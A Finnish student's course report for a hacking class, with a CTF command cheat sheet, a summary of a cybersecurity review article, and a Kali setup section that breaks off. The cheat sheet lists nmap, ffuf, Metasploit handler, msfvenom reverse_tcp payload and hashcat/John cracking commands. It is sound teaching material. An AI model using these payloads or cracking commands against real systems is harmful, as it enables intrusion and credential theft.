# a) Cheatsheet. Kerää parhaat komennot lipunryöstöä varten. Lähteinä voit käyttää omia ja kurssikavereiden läksyraportteja, vanhoja cheatsheet:eja sekä vierailijoiden kalvoja. (Kerää nimenomaan ne komennot ja sisältö, ei pelkkää linkkilistaa, ei pelkkää kuvailua. Tässä alakohdassa komentoja ei tarvitse kokeilla koneella).

NMAP
| Syntax | Description |
| :--- | ---: |
| nmap -A -p- <'ip-address'> | Laaja porttiskannaus kaikille portille 1-65535 kohde IP koneelle. |
| nmap <'ip-address'> | Perusmuotoinen TCP SYN skannaus yleisimmille porteille 1-1000 kohde IP koneelle. |
| nmap --top-ports <'n'> <'ip-address'> | Perusmuotoinen skannaus yleisimmille 'n' määrälle porteille. Yleensä 1000. |  

FFUF
| Syntax | Description |
| :--- | ---: |
| ./ffuf -w common.txt -u http://kohdeURL/FUZZ | -w käyttää common.txt worlistia fuzzaamiseen, -u syötetään fuzzattava URL |
| ./ffuf -w common.txt -u http://kohdeURL/FUZZ -fc; -fl; -fmode; -fr; -fs; -ft; -fw | Filtterit : c > HTTP stat codes, l > lines, mode > parameters, r > regexp, s > size, t > time, w > wordcount |


METASPLOIT FRAMEWORK
| Syntax | Description |
| :--- | ---: |
| jobs -l ; -k | -l listaa käynnissä olevat tehtävät ja -k pysäyttävät ne. |
| sessions -l ; -i | -l listaa käynnissä olevat meterpreter sessiot ja -i ottaa siihen yhteyden |
| show -h  | Näyttävät vaihtoehdot mitä voidaan näyttää esim. payloads, exploits, plugins jne. |

METASPLOIT/MULTI/HANDLER
| Syntax | Description |
| :--- | ---: |
| use exploit/multi/handler | Payload handlerin käyttö |
| set PAYLOAD; LHOST; LPORT; ExitOnSession; run | Multi-handler parametrien asetukset |

MSFVENOM 
| Syntax | Description |
| :--- | ---: |
| msfvenom -p <'PAYLOAD'> -f <'Filetype'> LHOST= <'localhost-ip'> LPORT= <'listeningport'> > <'output-filename'> | msfvenom payloadin generointi |
| msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f elf > reverse.elf | Linux reverse-tcp payload generointi |
| msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > reverse.exe | Windows reverse-tcp payload generointi |


JOHN THE RIPPER
| Syntax | Description |
| :--- | ---: |
| ./john/run/<'module-name'> > 'output-file.hash' | Ajaa run hakemistosta valitun moduulin joka ottaa hash tiedon ja ulostaa sen toiseen tiedostoon |
| ./john/run/john <'finlename.hash'> | Aloittaa hashin murtamista |

HASHCAT / HASHID
| Syntax | Description |
| :--- | ---: |
| hashid -m <'hash'> | Analysoi hashin ja sen mahdollista tyyppiä |
| hashcat -m <'mode-number'> <'hash'> <'wordlist.txt'> -o <'outputfile'> | -m kertoo hashmoden ja wordlistiin syötetään esim rockyou.txt ja -o ulostaa murretun hashin erilliseen tiedostoon. |

# b) Review. Etsi ja tiivistä vertaisarviotu katsausartikkeli valitsemaltasi kyberturvallisuuden tai hakkeroinnin alalta.

## Artikkelin valinta

Artikkeliksi valitsin Kaur J.:n ja Ramkumar K.R.:n kirjoittaman katsausartikkelin "The recent trends in cyber security: A review" joka on osana "Journal of King Saud University - Computer and Information Sciences" -Lehteä/sarjaa. Lehti on on saanut Julkaisufoorumin arvioinnin tasoa 1. Artikkeli on ollut julkisesti saatavilla 9.2.2021 ja sen virallinen lehtijulkaisuajankohta oli 9/2022.

Julkaisufoorumin arvio:
https://jfp.csc.fi/#!PublicationInformationView/id/84096

Artikkelia pääsee lukemaan tästä: 
https://www.sciencedirect.com/science/article/pii/S1319157821000203

Sen saa myös ilmaiseksi ladattuna PDF-muodossa.

## Artikkelin tiivistelmä


- Artikkelissa käsitellään nykyajan tietotuvan uusista menetelmistä ja teknologiasta, jolla pyritään tietoturvallisuuden viitekehyksiä. Se toimii ylipäätään teknisenä raporttina nykytutkijoille tietoturvan nykyisisestä tilasta.
-  Iso-Britannia on esittänyt kansallisen National Security Strategy vuosina 2016-2021 ja satsannut siihen 1.9 miljardia puntaa(£) kansallisen tietoturvansa parantamiseksi.
-  Vuonna 2018, Lähes 70 valtiota ovat jollakin tasolla dokumentoidusti kehittäneet heidän tietoturvastrategiansa.
- Artikkelissa käsiteltiin hieman kryptografian historiasta, jossa nykyajan salausmenetelmistä alkoi DES menetelmällä vuonna 1977. Tämä kuitenkin murrettiin vuonna 1999 alle 24 tunnissa brute-force hyökkäyksellä ja todettiin epäluotettavaksi lyhyen kirjainmääränsä vuoksi (56-bit).
DES menetelmälle kehitettiin EDE-mode (3DES) joka kolminkertaisti pituutensa (168-bit).
Vuonna 2001 NIST julisti valitsevansa uuden salausmenetelmän AES, jossa oli vaihtelevat pituudet (128, 192, 256 bittiä). AES ei ole tähän päivään asti pystytty murtamaan.
- Vuonna 1976, Diffie-Hellman menetelmä oli yksiä ensimmäisiä salausmenetelmiä, jossa hyödynnettiin jaetun avaimen salausmenetelmää. Tästä kehitettiin RSA menetelmä vuonna 1978 johon lisättiin julkisen avaimen menetelmää, joka myös yleisesti käytetään nykypäivänä.
- Nykypäivän RSA ja AES menetelmät halutaan parantaa implementoimalla Quantum cryptography menetelmiä. Quantum-salausmenetelmissä käytetään bittien sijaan Qbitteja, mitkä ovat mahdottomia kopioida, sekä mahdotonta tunnistaa minkälaisen suodattimen kautta sen purkamiseen käytetään. Quantum-tietokoneita ovat vielä kehitteellä, mutta voivat artikkelin mukaan olla käytössä jo vuonna 2025.
- Artikkelissa puhuttiin Side-Channel hyökkäyksistä (SCA). Näitä hyökkäyksiä salausmenetelmiä vastaan eivät suorannaisesti yritä murtaa salausta, vaan keskittyvät salauksen tekemiseen käytettäviin laitteisiin tai fyysisiin kanaviin. Tietoja voivat olla signaaleja, elektromagneettisia vuotoja, virrankulutustiedot, ajastustiedot ja äänitiedot.

# c) Valmiina lipunryöstöön. Asenna läppärillesi tarvittavat työkalut lipunryöstöön. Hyökkäyskone voi olla virtuaalikone. Se ei saa sisältää luottamuksellisia tietoja, koska sitä voi olla tarpeen tarkistaa ja tutkia harjoituksen yhteydessä. Koneella saatetaan ajaa testibinäärejä ja kontteja; sekä tarkastamiseen liittyviä ohjelmia. Harjoituksessa saattaa olla Docker-kontteja, kokeile, että Docker toimii (Muistaakseni 'sudo apt-get -y install docker.io').

Käytän tässä lipunryöstötehtävässä kurssilla käyttämääni Kali virtuaalikonetta

Varmistin, että minulla ei ollut arkaluonteista dataa konella. Tarkistin, että minulla oli tarvittavat paketit ja työkalut asennettuna lipunryöstöä varten:

Metasploit:


